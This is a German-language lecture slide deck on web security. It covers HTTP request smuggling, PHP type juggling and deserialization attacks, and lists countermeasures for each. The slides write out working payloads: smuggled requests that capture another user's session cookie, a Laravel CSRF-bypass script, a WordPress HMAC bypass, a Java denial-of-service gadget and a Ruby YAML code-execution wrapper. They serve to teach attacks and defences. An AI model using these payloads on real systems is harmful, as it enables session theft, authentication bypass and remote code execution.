---
author: Andreas Happe
title: Web Security
--- 

# HTTP Request Smuggling

## About

* Angriff auf die "Infrastruktur"
* Kudos zu [PortSwigger](https://portswigger.net/web-security/request-smuggling)
* Community Mention 2019

## Normaler Ablauf

![Picture](0x08_revproxy.svg){.stretch}

## Angriff

![Picture](0x08_revproxy-desynced.svg){.stretch}

## HTTP Request Länge

Content-Length Header:

``` http
POST /search HTTP/1.1
Host: normal-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling
```

## Angriff (~2005):

``` http
POST / HTTP/1.1
Host: example.com
Content-Length: 6
Content-Length: 5

12345G
```

Might result in:
``` http
POST / HTTP/1.1
Host: example.com
Content-Length: 6
Content-Length: 5

12345GPOST / HTTP/1.1
Host: example.com
```

## This was fixed..

## HTTP Request Länge

"chunked" (0xb == 11):

``` http
POST /search HTTP/1.1
Host: normal-website.com
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

b
q=smuggling
0
```

## Angriff (~2019):

CL -> TE

``` http
 POST / HTTP/1.1
 Host: vulnerable-website.com
 Content-Length: 13
 Transfer-Encoding: chunked

 0

 SMUGGLED 
 ```

## Angriff (~2019):

TE -> CL

``` http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0
```

## Angriff (~2019) 

TE -> TE

```
Transfer-Encoding: xchunked

Transfer-Encoding : chunked

Transfer-Encoding: chunked
Transfer-Encoding: x

Transfer-Encoding:[tab]chunked

[space]Transfer-Encoding: chunked

X: X[\n]Transfer-Encoding: chunked

Transfer-Encoding
: chunked
```

## But what to do with that

## But what to do with that

```
GET / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 324

0

POST /post/comment HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 400
Cookie: session=BOe1lFDosZ9lk7NLUpWcG8mjiwbeNZAO

csrf=SmsWiwIJ07Wg5oqX87FfUVkMThn9VzO0&postId=2&name=Carlos+Montoya&email=carlos%40normal-user.net&website=https%3A%2F%2Fnormal-user.net&comment=
```

## Results in

```
POST /post/comment HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 400
Cookie: session=BOe1lFDosZ9lk7NLUpWcG8mjiwbeNZAO

csrf=SmsWiwIJ07Wg5oqX87FfUVkMThn9VzO0&postId=2&name=Carlos+Montoya&email=carlos%40normal-user.net&website=https%3A%2F%2Fnormal-user.net&comment=GET / HTTP/1.1
Host: vulnerable-website.com
Cookie: session=jJNLJs2RKpbg9EQ7iWrcfzwaTvMw81Rj
... 
```

## Gegenmassnahmen

* Jeden Backend-Request über eine eigene Connection schicken
* Backend und Frontend müssen den gleichen Längen-Identifier verwenden
* HTTP/2 verwenden

# PHP Type Juggling

## Vergleichsoperator ===

![Picture](0x09_type_juggling_1.png){.stretch}

## Vergleichsoperator ==

![Picture](0x09_type_juggling_2.png){.stretch}

## Hint

* es gibt auch != und !==

## Fun Examples

``` php
TRUE: "0000" == int(0)
TRUE: "0e12" == int(0)
TRUE: "1abc" == int(1)
TRUE: "0abc" == int(0)
TRUE: "abc"  == int(0) // !!
TRUE: "0e12345" == "0e54321"
TRUE: "0e12345" <= "1"
TRUE: "0e12345" == "0"
TRUE: "0xF"     == "15"
```

## Exploit 1 (Larabel CSRF-Bypass)

``` php
if (Session::token() != Input::get('_token')) {
   throw new Illuminate\Session\TokenMismatchException;
}
// authenticated operation
```

Token: Random-String, in 85% der Fälle mit 0 oder Buchstaben als erstes Zeichen

## Exploit 1 (Larabel CSRF-Bypass)

Exploit:
```
$.ajax("http://<laravel app>/sensitiveaction", {
	type: 'post',
	contentType: 'application/x-www-form-urlencoded; charset=UTF-8; /json',
	data: '{"sensitiveparam": "sensitive", "_token": 0}',});
```

## Exploit 2 (Wordpress Auth Bypass)

``` php
# Cookie vom Browser:
# beinhaltet: $hmac, $user, $expiration

# serverseitiger Check
if ($hmac == hash_hmac('md5', $user .'|'. $expiration, $key)) {
  // authenticated operation
}
```

## Attack

``` php
cookie: set $hmac=0, $user=admin
brute-force over expiration
hash_mac('md5', "admin"."|"."some-date", $key) -> "some-hash.."
```

``` php
if ($hmac == hash_hmac('md5', $user .'|'. $expiration, $key)) {
  // authenticated operation
}
```

``` php
# What if hash looks like "0eabcdefg" and $hmac is set to "0"
if ("0" == "0eabcdefg") { // transforms to "0" == "0"
   // authenticated operation
}
```

# Serilization Attacks

## Was ist Serialisierung

![Picture](0x08_serialization.jpg){.stretch}

## Grundidee Angriff

* Angreifer modifiziert das serialisierte Objekt
* ..bringt den Deserialisierer zum Abstürzen
* ..kann das deserialisierte Objekt modifizieren
* ..kann potentiell Code ausführen

## Client-Side State

Am Beispiel [PHP](http://www.phpinternalsbook.com/php5/classes_objects/serialization.html)

```
a:4:{i:0;i:132;i:1;s:7:"Mallory";i:2;s:4:"user"; i:3;s:32:"b6a8b3bea87fe0e05022f8f3c88bc960";}

# attack
a:4:{i:0;i:132;i:1;s:7:"Mallory";i:2;s:5:"admin"; i:3;s:32:"b6a8b3bea87fe0e05022f8f3c88bc960";}
```

## Java Serialization Attack

* Problem: Objekt wird erst deserialisiert und danach erst überprüft
* Falls ein Fehler bei der Deserialiserung passiert, dann wird dies zu spät abgefangen

``` Java
InputStream is = request.getInputStream();
ObjectInputStream ois = new ObjectInputStream(is);
AcmeObject acme = (AcmeObject)ois.readObject();
```

## Java Serilization Attack

``` Java
Set root = new HashSet();
Set s1 = root;
Set s2 = new HashSet();
for (int i = 0; i < 100; i++) {
  Set t1 = new HashSet();
  Set t2 = new HashSet();
  t1.add("foo"); // make it not equal to t2
  s1.add(t1);
  s1.add(t2);
  s2.add(t1);
  s2.add(t2);
  s1 = t1;
  s2 = t2;
}
```

## Schlimmer: Code Execution

* Über das deserilisierierte Objekt wird Code executed
* Die verwendete Klasse muss im Zielsystem bekannt sein
* Meistens werden Konstruktoren von häufigen Bibliotheken verwendet
* Liste von Vektoren, z. B. [ysoserial](https://github.com/frohoff/ysoserial)

## Ruby on Rails Serilialisierung

```ruby
code  = File.read(ARGV[1])

# Construct a YAML payload wrapped in XML
payload = <<-PAYLOAD.strip.gsub("\n", "&#10;")
<fail type="yaml">
--- !ruby/object:ERB
  template:
      src: !binary |-
            #{Base64.encode64(code)}
	    </fail>
	    PAYLOAD
```

## Java Serialization Attack: Controls

* Deserialiseriung nicht verwenden
* Austauschen des Deserialisierers mit Custom Serializer (look-ahead)
* Serialiserungsoperationen müssen authenticated und authorized sein
* Serialisierte Objekte müssen integritätsgeschützt werden

# FIN
